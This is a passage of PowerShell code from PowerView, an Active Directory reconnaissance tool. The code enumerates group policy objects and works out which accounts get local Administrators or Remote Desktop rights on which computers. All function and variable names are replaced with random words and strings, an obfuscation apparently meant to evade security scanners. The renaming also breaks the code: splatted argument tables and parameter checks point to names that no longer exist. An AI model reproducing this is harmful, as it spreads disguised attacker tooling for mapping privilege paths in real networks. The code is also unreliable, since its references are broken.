                                        if ($LlkjxmSJ99) {
                                            if ($wuuXhYcn99 -eq 2) {
                                                $GpoDN
                                            }
                                        }
                                        else {
                                            $GpoDN
                                        }
                                    }
                                }
                            }

                            if ($_.gpoptions -eq 1) {
                                $LlkjxmSJ99 = $True
                            }
                        }
                    }
                }

                if ($hfRnqCMk99) {
                    $JGuggFFF99 = (cancer -wkNUqpQt99 $hfRnqCMk99).SiteName
                    if($JGuggFFF99 -and ($JGuggFFF99 -notlike 'Error*')) {
                        $xfOIjAld99['Identity'] = $JGuggFFF99
                        $VJxeHFAJ99 += breastbones @SearcherArguments | ForEach-Object {
                            if($_.gplink) {
                                $_.gplink.split('][') | ForEach-Object {
                                    if ($_.startswith('LDAP')) {
                                        $_.split(';')[0]
                                    }
                                }
                            }
                        }
                    }
                }

                $flTHCSqg99 = $CGiGIpkb99.SubString($CGiGIpkb99.IndexOf('DC='))
                $xfOIjAld99.Remove('Identity')
                $xfOIjAld99.Remove('Properties')
                $xfOIjAld99['LDAPFilter'] = "(objectclass=domain)(distinguishedname=$flTHCSqg99)"
                $VJxeHFAJ99 += grow @SearcherArguments | ForEach-Object {
                    if($_.gplink) {
                        $_.gplink.split('][') | ForEach-Object {
                            if ($_.startswith('LDAP')) {
                                $_.split(';')[0]
                            }
                        }
                    }
                }
                Write-Verbose "[angle] GPOAdsPaths: $VJxeHFAJ99"

                if ($xCZOySkJ99) { $xfOIjAld99['Properties'] = $xCZOySkJ99 }
                else { $xfOIjAld99.Remove('Properties') }
                $xfOIjAld99.Remove('Identity')

                $VJxeHFAJ99 | Where-Object {$_ -and ($_ -ne '')} | ForEach-Object {
                    $xfOIjAld99['SearchBase'] = $_
                    $xfOIjAld99['LDAPFilter'] = "(objectCategory=groupPolicyContainer)"
                    grow @SearcherArguments | ForEach-Object {
                        if ($PSBoundParameters['Raw']) {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                        }
                        else {
                            $_.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                        }
                        $_
                    }
                }
            }
            else {
                $zdhlwIap99 = ''
                $cqPynTGG99 = ''
                $aCzrnrLk99 | Where-Object {$_} | ForEach-Object {
                    $JmddWUUS99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($JmddWUUS99 -match 'LDAP://|^CN=.*') {
                        $zdhlwIap99 += "(distinguishedname=$JmddWUUS99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $MuprcxcZ99 = $JmddWUUS99.SubString($JmddWUUS99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[angle] Extracted domain '$MuprcxcZ99' from '$JmddWUUS99'"
                            $xfOIjAld99['Domain'] = $MuprcxcZ99
                            $ZdfHYdiP99 = foaling @SearcherArguments
                            if (-not $ZdfHYdiP99) {
                                Write-Warning "[angle] Unable to retrieve domain searcher for '$MuprcxcZ99'"
                            }
                        }
                    }
                    elseif ($JmddWUUS99 -match '{.*}') {
                        $zdhlwIap99 += "(name=$JmddWUUS99)"
                    }
                    else {
                        try {
                            $osroZIBb99 = (-Join (([Guid]$JmddWUUS99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                            $zdhlwIap99 += "(objectguid=$osroZIBb99)"
                        }
                        catch {
                            $zdhlwIap99 += "(displayname=$JmddWUUS99)"
                        }
                    }
                }
                if ($zdhlwIap99 -and ($zdhlwIap99.Trim() -ne '') ) {
                    $cqPynTGG99 += "(|$zdhlwIap99)"
                }

                if ($PSBoundParameters['LDAPFilter']) {
                    Write-Verbose "[angle] Using additional LDAP filter: $RUtJqxpA99"
                    $cqPynTGG99 += "$RUtJqxpA99"
                }

                $ZdfHYdiP99.filter = "(&(objectCategory=groupPolicyContainer)$cqPynTGG99)"
                Write-Verbose "[angle] filter string: $($ZdfHYdiP99.filter)"

                if ($PSBoundParameters['FindOne']) { $vDOGrGBR99 = $ZdfHYdiP99.FindOne() }
                else { $vDOGrGBR99 = $ZdfHYdiP99.FindAll() }
                $vDOGrGBR99 | Where-Object {$_} | ForEach-Object {
                    if ($PSBoundParameters['Raw']) {
                        $GPO = $_
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO.Raw')
                    }
                    else {
                        if ($PSBoundParameters['SearchBase'] -and ($leCQEaFf99 -Match '^GC://')) {
                            $GPO = meridian -kaLEgole99 $_.Properties
                            try {
                                $GPODN = $GPO.distinguishedname
                                $MrVhzDYF99 = $GPODN.SubString($GPODN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                                $VBVizrXZ99 = "\\$MrVhzDYF99\SysVol\$MrVhzDYF99\Policies\$($GPO.cn)"
                                $GPO | Add-Member Noteproperty 'gpcfilesyspath' $VBVizrXZ99
                            }
                            catch {
                                Write-Verbose "[angle] Error calculating gpcfilesyspath for: $($GPO.distinguishedname)"
                            }
                        }
                        else {
                            $GPO = meridian -kaLEgole99 $_.Properties
                        }
                        $GPO.PSObject.TypeNames.Insert(0, 'PowerView.GPO')
                    }
                    $GPO
                }
                if ($vDOGrGBR99) {
                    try { $vDOGrGBR99.dispose() }
                    catch {
                        Write-Verbose "[angle] Error disposing of the Results object: $_"
                    }
                }
                $ZdfHYdiP99.dispose()
            }
        }
    }
}


function Medina {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOGroup')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String[]]
        $aCzrnrLk99,

        [Switch]
        $RbSjGqsS99,

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $RUtJqxpA99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Domain']) { $xfOIjAld99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['LDAPFilter']) { $xfOIjAld99['LDAPFilter'] = $XQOKQXGr99 }
        if ($PSBoundParameters['SearchBase']) { $xfOIjAld99['SearchBase'] = $leCQEaFf99 }
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $xfOIjAld99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $xfOIjAld99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $xfOIjAld99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        $LMcZTOxl99 = @{}
        if ($PSBoundParameters['Domain']) { $LMcZTOxl99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $LMcZTOxl99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $LMcZTOxl99['Credential'] = $ZiReXCQu99 }

        $dpILeMHL99 = [System.StringSplitOptions]::RemoveEmptyEntries
    }

    PROCESS {
        if ($PSBoundParameters['Identity']) { $xfOIjAld99['Identity'] = $aCzrnrLk99 }

        angle @SearcherArguments | ForEach-Object {
            $LzEzMQLm99 = $_.displayname
            $JyqWlBxr99 = $_.name
            $pjTgwVdc99 = $_.gpcfilesyspath

            $mCwgcTgn99 =  @{ 'GptTmplPath' = "$pjTgwVdc99\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" }
            if ($PSBoundParameters['Credential']) { $mCwgcTgn99['Credential'] = $ZiReXCQu99 }

            $Inf = lunar @ParseArgs

            if ($Inf -and ($Inf.psbase.Keys -contains 'Group Membership')) {
                $EKevPMFA99 = @{}

                ForEach ($iIxmpuxj99 in $Inf.'Group Membership'.GetEnumerator()) {
                    $Group, $gRNSqaui99 = $iIxmpuxj99.Key.Split('__', $dpILeMHL99) | ForEach-Object {$_.Trim()}
                    $rWmnvoAz99 = $iIxmpuxj99.Value | Where-Object {$_} | ForEach-Object { $_.Trim('*') } | Where-Object {$_}

                    if ($PSBoundParameters['ResolveMembersToSIDs']) {
                        $zNfMTnuW99 = @()
                        ForEach ($mNFtVFpM99 in $rWmnvoAz99) {
                            if ($mNFtVFpM99 -and ($mNFtVFpM99.Trim() -ne '')) {
                                if ($mNFtVFpM99 -notmatch '^S-1-.*') {
                                    $iQrDrvvn99 = @{'ObjectName' = $mNFtVFpM99}
                                    if ($PSBoundParameters['Domain']) { $iQrDrvvn99['Domain'] = $XQOKQXGr99 }
                                    $aVnzkMKs99 = imprison @ConvertToArguments

                                    if ($aVnzkMKs99) {
                                        $zNfMTnuW99 += $aVnzkMKs99
                                    }
                                    else {
                                        $zNfMTnuW99 += $mNFtVFpM99
                                    }
                                }
                                else {
                                    $zNfMTnuW99 += $mNFtVFpM99
                                }
                            }
                        }
                        $rWmnvoAz99 = $zNfMTnuW99
                    }

                    if (-not $EKevPMFA99[$Group]) {
                        $EKevPMFA99[$Group] = @{}
                    }
                    if ($rWmnvoAz99 -isnot [System.Array]) {$rWmnvoAz99 = @($rWmnvoAz99)}
                    $EKevPMFA99[$Group].Add($gRNSqaui99, $rWmnvoAz99)
                }

                ForEach ($iIxmpuxj99 in $EKevPMFA99.GetEnumerator()) {
                    if ($iIxmpuxj99 -and $iIxmpuxj99.Key -and ($iIxmpuxj99.Key -match '^\*')) {
                        $hybwYFBb99 = $iIxmpuxj99.Key.Trim('*')
                        if ($hybwYFBb99 -and ($hybwYFBb99.Trim() -ne '')) {
                            $nVmmyinF99 = retrain -ObjectSID $hybwYFBb99 @ConvertArguments
                        }
                        else {
                            $nVmmyinF99 = $False
                        }
                    }
                    else {
                        $nVmmyinF99 = $iIxmpuxj99.Key

                        if ($nVmmyinF99 -and ($nVmmyinF99.Trim() -ne '')) {
                            if ($nVmmyinF99 -match 'Administrators') {
                                $hybwYFBb99 = 'S-1-5-32-544'
                            }
                            elseif ($nVmmyinF99 -match 'Remote Desktop') {
                                $hybwYFBb99 = 'S-1-5-32-555'
                            }
                            elseif ($nVmmyinF99 -match 'Guests') {
                                $hybwYFBb99 = 'S-1-5-32-546'
                            }
                            elseif ($nVmmyinF99.Trim() -ne '') {
                                $iQrDrvvn99 = @{'ObjectName' = $nVmmyinF99}
                                if ($PSBoundParameters['Domain']) { $iQrDrvvn99['Domain'] = $XQOKQXGr99 }
                                $hybwYFBb99 = imprison @ConvertToArguments
                            }
                            else {
                                $hybwYFBb99 = $Null
                            }
                        }
                    }

                    $ojkLofVC99 = New-Object PSObject
                    $ojkLofVC99 | Add-Member Noteproperty 'GPODisplayName' $LzEzMQLm99
                    $ojkLofVC99 | Add-Member Noteproperty 'GPOName' $JyqWlBxr99
                    $ojkLofVC99 | Add-Member Noteproperty 'GPOPath' $pjTgwVdc99
                    $ojkLofVC99 | Add-Member Noteproperty 'GPOType' 'RestrictedGroups'
                    $ojkLofVC99 | Add-Member Noteproperty 'Filters' $Null
                    $ojkLofVC99 | Add-Member Noteproperty 'GroupName' $nVmmyinF99
                    $ojkLofVC99 | Add-Member Noteproperty 'GroupSID' $hybwYFBb99
                    $ojkLofVC99 | Add-Member Noteproperty 'GroupMemberOf' $iIxmpuxj99.Value.Memberof
                    $ojkLofVC99 | Add-Member Noteproperty 'GroupMembers' $iIxmpuxj99.Value.Members
                    $ojkLofVC99.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                    $ojkLofVC99
                }
            }

            $mCwgcTgn99 =  @{
                'GroupsXMLpath' = "$pjTgwVdc99\MACHINE\Preferences\Groups\Groups.xml"
            }

            mousey @ParseArgs | ForEach-Object {
                if ($PSBoundParameters['ResolveMembersToSIDs']) {
                    $zNfMTnuW99 = @()
                    ForEach ($mNFtVFpM99 in $_.GroupMembers) {
                        if ($mNFtVFpM99 -and ($mNFtVFpM99.Trim() -ne '')) {
                            if ($mNFtVFpM99 -notmatch '^S-1-.*') {

                                $iQrDrvvn99 = @{'ObjectName' = $nVmmyinF99}
                                if ($PSBoundParameters['Domain']) { $iQrDrvvn99['Domain'] = $XQOKQXGr99 }
                                $aVnzkMKs99 = imprison -XQOKQXGr99 $XQOKQXGr99 -prIHNbyB99 $mNFtVFpM99

                                if ($aVnzkMKs99) {
                                    $zNfMTnuW99 += $aVnzkMKs99
                                }
                                else {
                                    $zNfMTnuW99 += $mNFtVFpM99
                                }
                            }
                            else {
                                $zNfMTnuW99 += $mNFtVFpM99
                            }
                        }
                    }
                    $_.GroupMembers = $zNfMTnuW99
                }

                $_ | Add-Member Noteproperty 'GPODisplayName' $LzEzMQLm99
                $_ | Add-Member Noteproperty 'GPOName' $JyqWlBxr99
                $_ | Add-Member Noteproperty 'GPOType' 'GroupPolicyPreferences'
                $_.PSObject.TypeNames.Insert(0, 'PowerView.GPOGroup')
                $_
            }
        }
    }
}


function Prague {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GPOUserLocalGroupMapping')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $aCzrnrLk99,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $hQyyeJwV99 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $eGgywkyS99 = @{}
        if ($PSBoundParameters['Domain']) { $eGgywkyS99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $eGgywkyS99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $eGgywkyS99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $eGgywkyS99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $eGgywkyS99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $eGgywkyS99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $eGgywkyS99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        $gwmjoHwK99 = @()

        if ($PSBoundParameters['Identity']) {
            $gwmjoHwK99 += grow @CommonArguments -aCzrnrLk99 $aCzrnrLk99 | Select-Object -Expand objectsid
            $juNopLcG99 = $gwmjoHwK99
            if (-not $gwmjoHwK99) {
                Throw "[Prague] Unable to retrieve SID for identity '$aCzrnrLk99'"
            }
        }
        else {
            $gwmjoHwK99 = @('*')
        }

        if ($hQyyeJwV99 -match 'S-1-5') {
            $PwPkPLYp99 = $hQyyeJwV99
        }
        elseif ($hQyyeJwV99 -match 'Admin') {
            $PwPkPLYp99 = 'S-1-5-32-544'
        }
        else {
            $PwPkPLYp99 = 'S-1-5-32-555'
        }

        if ($gwmjoHwK99[0] -ne '*') {
            ForEach ($UZgPkOzH99 in $gwmjoHwK99) {
                Write-Verbose "[Prague] Enumerating nested group memberships for: '$UZgPkOzH99'"
                $gwmjoHwK99 += grownup @CommonArguments -kaLEgole99 'objectsid' -RAWtpuWe99 $UZgPkOzH99 | Select-Object -ExpandProperty objectsid
            }
        }

        Write-Verbose "[Prague] Target localgroup SID: $PwPkPLYp99"
        Write-Verbose "[Prague] Effective target domain SIDs: $gwmjoHwK99"

        $DvLDQezk99 = Medina @CommonArguments -RbSjGqsS99 | ForEach-Object {
            $ojkLofVC99 = $_
            if ($ojkLofVC99.GroupSID -match $PwPkPLYp99) {
                $ojkLofVC99.GroupMembers | Where-Object {$_} | ForEach-Object {
                    if ( ($gwmjoHwK99[0] -eq '*') -or ($gwmjoHwK99 -Contains $_) ) {
                        $ojkLofVC99
                    }
                }
            }
            if ( ($ojkLofVC99.GroupMemberOf -contains $PwPkPLYp99) ) {
                if ( ($gwmjoHwK99[0] -eq '*') -or ($gwmjoHwK99 -Contains $ojkLofVC99.GroupSID) ) {
                    $ojkLofVC99
                }
            }
        } | Sort-Object -Property GPOName -Unique

        $DvLDQezk99 | Where-Object {$_} | ForEach-Object {
            $JyqWlBxr99 = $_.GPODisplayName
            $peacMRxP99 = $_.GPOName
            $pjTgwVdc99 = $_.GPOPath
            $tDnoHYvL99 = $_.GPOType
            if ($_.GroupMembers) {
                $OALGlXEf99 = $_.GroupMembers
            }
            else {
                $OALGlXEf99 = $_.GroupSID
            }

            $mtnFimjS99 = $_.Filters

            if ($gwmjoHwK99[0] -eq '*') {
                $vQabrISx99 = $OALGlXEf99
            }
            else {
                $vQabrISx99 = $juNopLcG99
            }

            even @CommonArguments -Raw -kaLEgole99 'name,distinguishedname' -VKonGJAa99 $peacMRxP99 | ForEach-Object {
                if ($mtnFimjS99) {
                    $XFFBXGVZ99 = Rankine @CommonArguments -kaLEgole99 'dnshostname,distinguishedname' -leCQEaFf99 $_.Path | Where-Object {$_.distinguishedname -match ($mtnFimjS99.Value)} | Select-Object -ExpandProperty dnshostname
                }
                else {
                    $XFFBXGVZ99 = Rankine @CommonArguments -kaLEgole99 'dnshostname' -leCQEaFf99 $_.Path | Select-Object -ExpandProperty dnshostname
                }

                if ($XFFBXGVZ99) {
                    if ($XFFBXGVZ99 -isnot [System.Array]) {$XFFBXGVZ99 = @($XFFBXGVZ99)}

                    ForEach ($UZgPkOzH99 in $vQabrISx99) {
                        $Object = grow @CommonArguments -aCzrnrLk99 $UZgPkOzH99 -kaLEgole99 'samaccounttype,samaccountname,distinguishedname,objectsid'

                        $JcwVjkwp99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $vwDwSfYQ99 = New-Object PSObject
                        $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                        $vwDwSfYQ99 | Add-Member Noteproperty 'Domain' $XQOKQXGr99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'IsGroup' $JcwVjkwp99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'GPODisplayName' $JyqWlBxr99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'GPOGuid' $peacMRxP99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'GPOPath' $pjTgwVdc99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'GPOType' $tDnoHYvL99
                        $vwDwSfYQ99 | Add-Member Noteproperty 'ContainerName' $_.Properties.distinguishedname
                        $vwDwSfYQ99 | Add-Member Noteproperty 'ComputerName' $XFFBXGVZ99
                        $vwDwSfYQ99.PSObject.TypeNames.Insert(0, 'PowerView.GPOLocalGroupMapping')
                        $vwDwSfYQ99
                    }
                }
            }

            breastbones @CommonArguments -kaLEgole99 'siteobjectbl,distinguishedname' -VKonGJAa99 $peacMRxP99 | ForEach-Object {
                ForEach ($UZgPkOzH99 in $vQabrISx99) {
                    $Object = grow @CommonArguments -aCzrnrLk99 $UZgPkOzH99 -kaLEgole99 'samaccounttype,samaccountname,distinguishedname,objectsid'

                    $JcwVjkwp99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                    $vwDwSfYQ99 = New-Object PSObject
                    $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                    $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                    $vwDwSfYQ99 | Add-Member Noteproperty 'ObjectSID' $Object.objectsid
                    $vwDwSfYQ99 | Add-Member Noteproperty 'IsGroup' $JcwVjkwp99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'Domain' $XQOKQXGr99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'GPODisplayName' $JyqWlBxr99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'GPOGuid' $peacMRxP99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'GPOPath' $pjTgwVdc99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'GPOType' $tDnoHYvL99
                    $vwDwSfYQ99 | Add-Member Noteproperty 'ContainerName' $_.distinguishedname
                    $vwDwSfYQ99 | Add-Member Noteproperty 'ComputerName' $_.siteobjectbl
                    $vwDwSfYQ99.PSObject.TypeNames.Add('PowerView.GPOLocalGroupMapping')
                    $vwDwSfYQ99
                }
            }
        }
    }
}


function pens {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.GGPOComputerLocalGroupMember')]
    [CmdletBinding(DefaultParameterSetName = 'ComputerIdentity')]
    Param(
        [Parameter(Position = 0, ParameterSetName = 'ComputerIdentity', Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('ComputerName', 'Computer', 'DistinguishedName', 'SamAccountName', 'Name')]
        [String]
        $iWdeRWnx99,

        [Parameter(Mandatory = $True, ParameterSetName = 'OUIdentity')]
        [Alias('OU')]
        [String]
        $iSZzCxwe99,

        [String]
        [ValidateSet('Administrators', 'S-1-5-32-544', 'RDP', 'Remote Desktop Users', 'S-1-5-32-555')]
        $hQyyeJwV99 = 'Administrators',

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $leCQEaFf99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $YtWADKZe99 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $JYnIcwBJ99 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Switch]
        $uomKXjrL99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $eGgywkyS99 = @{}
        if ($PSBoundParameters['Domain']) { $eGgywkyS99['Domain'] = $XQOKQXGr99 }
        if ($PSBoundParameters['Server']) { $eGgywkyS99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['SearchScope']) { $eGgywkyS99['SearchScope'] = $YtWADKZe99 }
        if ($PSBoundParameters['ResultPageSize']) { $eGgywkyS99['ResultPageSize'] = $JYnIcwBJ99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $eGgywkyS99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Tombstone']) { $eGgywkyS99['Tombstone'] = $uomKXjrL99 }
        if ($PSBoundParameters['Credential']) { $eGgywkyS99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['ComputerIdentity']) {
            $grEthsNj99 = Rankine @CommonArguments -aCzrnrLk99 $iWdeRWnx99 -kaLEgole99 'distinguishedname,dnshostname'

            if (-not $grEthsNj99) {
                throw "[pens] Computer $iWdeRWnx99 not found. Try a fully qualified host name."
            }

            ForEach ($LqojfQUN99 in $grEthsNj99) {

                $GaoctYLx99 = @()

                $DN = $LqojfQUN99.distinguishedname
                $MAGIJVPN99 = $DN.IndexOf('OU=')
                if ($MAGIJVPN99 -gt 0) {
                    $TXOCUKTL99 = $DN.SubString($MAGIJVPN99)
                }
                if ($TXOCUKTL99) {
                    $GaoctYLx99 += even @CommonArguments -leCQEaFf99 $TXOCUKTL99 -RUtJqxpA99 '(gplink=*)' | ForEach-Object {
                        Select-String -PMIEavdF99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                Write-Verbose "Enumerating the sitename for: $($LqojfQUN99.dnshostname)"
                $JGuggFFF99 = (cancer -wkNUqpQt99 $LqojfQUN99.dnshostname).SiteName
                if ($JGuggFFF99 -and ($JGuggFFF99 -notmatch 'Error')) {
                    $GaoctYLx99 += breastbones @CommonArguments -aCzrnrLk99 $JGuggFFF99 -RUtJqxpA99 '(gplink=*)' | ForEach-Object {
                        Select-String -PMIEavdF99 $_.gplink -Pattern '(\{){0,1}[0-9a-fA-F]{8}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{4}\-[0-9a-fA-F]{12}(\}){0,1}' -AllMatches | ForEach-Object {$_.Matches | Select-Object -ExpandProperty Value }
                    }
                }

                $GaoctYLx99 | Medina @CommonArguments | Sort-Object -Property GPOName -Unique | ForEach-Object {
                    $ojkLofVC99 = $_

                    if($ojkLofVC99.GroupMembers) {
                        $OALGlXEf99 = $ojkLofVC99.GroupMembers
                    }
                    else {
                        $OALGlXEf99 = $ojkLofVC99.GroupSID
                    }

                    $OALGlXEf99 | ForEach-Object {
                        $Object = grow @CommonArguments -aCzrnrLk99 $_
                        $JcwVjkwp99 = @('268435456','268435457','536870912','536870913') -contains $Object.samaccounttype

                        $PatDDEGT99 = New-Object PSObject
                        $PatDDEGT99 | Add-Member Noteproperty 'ComputerName' $LqojfQUN99.dnshostname
                        $PatDDEGT99 | Add-Member Noteproperty 'ObjectName' $Object.samaccountname
                        $PatDDEGT99 | Add-Member Noteproperty 'ObjectDN' $Object.distinguishedname
                        $PatDDEGT99 | Add-Member Noteproperty 'ObjectSID' $_
                        $PatDDEGT99 | Add-Member Noteproperty 'IsGroup' $JcwVjkwp99
                        $PatDDEGT99 | Add-Member Noteproperty 'GPODisplayName' $ojkLofVC99.GPODisplayName
                        $PatDDEGT99 | Add-Member Noteproperty 'GPOGuid' $ojkLofVC99.GPOName
                        $PatDDEGT99 | Add-Member Noteproperty 'GPOPath' $ojkLofVC99.GPOPath
                        $PatDDEGT99 | Add-Member Noteproperty 'GPOType' $ojkLofVC99.GPOType
                        $PatDDEGT99.PSObject.TypeNames.Add('PowerView.GPOComputerLocalGroupMember')
                        $PatDDEGT99
                    }
                }
            }
        }
    }
}


function unattractive {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Source', 'Name')]
        [String]
        $iSLvNeqN99 = 'Domain',

        [ValidateNotNullOrEmpty()]
        [String]
        $XQOKQXGr99,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $VmSwBdTN99,

        [ValidateRange(1, 10000)]
        [Int]
        $fEdVcXRd99,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $ZiReXCQu99 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $xfOIjAld99 = @{}
        if ($PSBoundParameters['Server']) { $xfOIjAld99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $xfOIjAld99['ServerTimeLimit'] = $fEdVcXRd99 }
        if ($PSBoundParameters['Credential']) { $xfOIjAld99['Credential'] = $ZiReXCQu99 }

        $LMcZTOxl99 = @{}
        if ($PSBoundParameters['Server']) { $LMcZTOxl99['Server'] = $VmSwBdTN99 }
        if ($PSBoundParameters['Credential']) { $LMcZTOxl99['Credential'] = $ZiReXCQu99 }
    }

    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $xfOIjAld99['Domain'] = $XQOKQXGr99
            $LMcZTOxl99['Domain'] = $XQOKQXGr99
        }

        if ($iSLvNeqN99 -eq 'All') {
            $xfOIjAld99['Identity'] = '*'
        }
        elseif ($iSLvNeqN99 -eq 'Domain') {
            $xfOIjAld99['Identity'] = '{31B2F340-016D-11D2-945F-00C04FB984F9}'
        }
        elseif (($iSLvNeqN99 -eq 'DomainController') -or ($iSLvNeqN99 -eq 'DC')) {
            $xfOIjAld99['Identity'] = '{6AC1786C-016F-11D2-945F-00C04FB984F9}'
        }
        else {
            $xfOIjAld99['Identity'] = $iSLvNeqN99
        }

        $mJaGyQmQ99 = angle @SearcherArguments

        ForEach ($GPO in $mJaGyQmQ99) {
